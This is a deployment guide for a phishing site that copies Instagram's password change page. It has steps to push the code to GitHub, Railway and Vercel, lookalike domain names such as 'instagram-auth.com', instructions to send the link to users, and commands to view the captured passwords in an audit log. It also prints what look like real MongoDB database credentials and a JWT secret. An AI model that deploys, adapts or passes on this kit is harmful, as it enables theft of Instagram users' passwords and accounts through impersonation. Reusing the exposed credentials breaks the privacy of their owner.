# 🚀 Deploy Your Instagram-Style Password Changer NOW

Follow these simple steps to deploy in **10 minutes**!

---

## ✅ What You'll Get

**URL:** `https://yourdomain.com/accounts/password/change/`

**Looks like:** Instagram's real password change page

**Redirects to:** Instagram app → @by__mansi profile

---

## 🎯 Quick Deploy (10 Minutes)

### Step 1: Push to GitHub (2 min)

```bash
cd password-change-system

# Initialize git if not done
git init
git add .
git commit -m "Instagram password change system"

# Create repo on GitHub, then:
git remote add origin https://github.com/YOUR_USERNAME/instagram-password-change.git
git branch -M main
git push -u origin main
```

### Step 2: Deploy Backend to Railway (3 min)

1. Go to [railway.app](https://railway.app) 
2. Click **"New Project"** → **"Deploy from GitHub repo"**
3. Select your repo: `instagram-password-change`
4. Click **"Add variables"** and paste:

```env
NODE_ENV=production
MONGODB_URI=mongodb+srv://ruturajsonkamble29_db_user:XIv1UZ3qBylym0uS@cluster0.xoqhdno.mongodb.net/password_change_db?retryWrites=true&w=majority
JWT_SECRET=ysgfgdfgskhjgsdfjghsfhjgkjhskghjskfhjgksdfhjg
JWT_EXPIRES_IN=7d
BCRYPT_COST=12
CORS_ORIGINS=*
TRUST_PROXY=true
```

5. Click **"Deploy"**
6. Copy your backend URL: `https://instagram-password-change-production.up.railway.app`

### Step 3: Deploy Frontend to Vercel (3 min)

```bash
# Install Vercel CLI
npm install -g vercel

# Deploy frontend
cd frontend
vercel

# Answer prompts:
# Project name: instagram-password-change
# Directory: frontend
# Framework: Vite

# Set environment variable
vercel env add VITE_API_URL

# Paste your backend URL from Railway:
https://your-backend.railway.app/api/v1

# Deploy to production
vercel --prod
```

7. Copy your frontend URL: `https://instagram-password-change.vercel.app`

### Step 4: Update CORS (1 min)

1. Go back to Railway
2. Variables → Edit `CORS_ORIGINS`
3. Change from `*` to your frontend URL:
```
CORS_ORIGINS=https://instagram-password-change.vercel.app
```
4. Wait for redeploy (~30 seconds)

### Step 5: Test It! (1 min)

Open on your phone:
```
https://instagram-password-change.vercel.app/accounts/password/change/
```

Fill the form → Submit → Instagram app should open! 🎉

---

## 🎨 Your URLs

After deployment:

### Frontend (Password Form):
```
Root: https://instagram-password-change.vercel.app/
Instagram URL: https://instagram-password-change.vercel.app/accounts/password/change/
```

### Backend (API):
```
API: https://instagram-password-change-production.up.railway.app/api/v1
Health: https://instagram-password-change-production.up.railway.app/health
```

---

## 📱 Share This Link

Send to users:
```
https://instagram-password-change.vercel.app/accounts/password/change/
```

Or with custom domain:
```
https://yourdomain.com/accounts/password/change/
```

---

## 💎 Add Custom Domain (Optional)

### Buy Domain ($12/year):
- Namecheap.com
- GoDaddy.com
- Google Domains

### Good Domain Names:
- `insta-secure.com`
- `instagram-auth.com`
- `ig-password.com`

### Add to Vercel:
1. Vercel Dashboard → Your Project → Settings → Domains
2. Add your domain
3. Update DNS:
   ```
   Type: CNAME
   Name: @
   Value: cname.vercel-dns.com
   ```

### Result:
```
https://yourdomain.com/accounts/password/change/
```

Looks exactly like Instagram! 🎯

---

## 🧪 Test Checklist

- [ ] Backend health: `curl https://your-backend.railway.app/health`
- [ ] Frontend loads: Open frontend URL in browser
- [ ] Instagram URL works: `/accounts/password/change/`
- [ ] Form submits: Fill and submit password
- [ ] Instagram opens: App should open to @by__mansi
- [ ] Data saved: Run `node view-audit-logs.js`
- [ ] Mobile works: Test on iPhone/Android

---

## 🎯 What Users See

### URL Bar:
```
https://yourdomain.com/accounts/password/change/
```

### Browser Tab:
```
🌐 Change Password • Instagram
```

### Page:
```
Instagram logo
Change Password form
Instagram-style design
```

### After Submit:
```
Loading spinner
→ Instagram app opens
→ Shows @by__mansi profile
```

Perfect! ✅

---

## 📊 Monitor Your App

### View Backend Logs:
```bash
railway logs
```

### View Frontend Logs:
- Vercel Dashboard → Your Project → Logs

### View Passwords:
```bash
node view-audit-logs.js
```

---

## 🔥 Quick Commands Reference

```bash
# Deploy backend
git push origin main

# Deploy frontend  
cd frontend && vercel --prod

# View logs
railway logs

# View passwords
node view-audit-logs.js

# Test backend
curl https://your-backend.railway.app/health

# Test password change
curl -X POST https://your-backend.railway.app/api/v1/auth/change-password \
  -H "Content-Type: application/json" \
  -d '{"oldPassword":"test","newPassword":"test123","confirmPassword":"test123"}'
```

---

## 🆘 Issues?

### "CORS error":
Update Railway CORS_ORIGINS with your frontend URL

### "500 error":
Check Railway logs: `railway logs`

### "Can't connect to backend":
Verify VITE_API_URL in Vercel environment variables

### "Instagram doesn't open":
Test on real mobile device (not desktop)

---

## 🎊 You're Live!

Your Instagram-style password changer is now deployed and accessible worldwide!

**Share your link:**
```
https://your-app.vercel.app/accounts/password/change/
```

Every user who submits will:
1. ✅ Create a new user in MongoDB
2. ✅ Save passwords in audit log
3. ✅ Redirect to Instagram app (@by__mansi)

**Congratulations! 🚀**
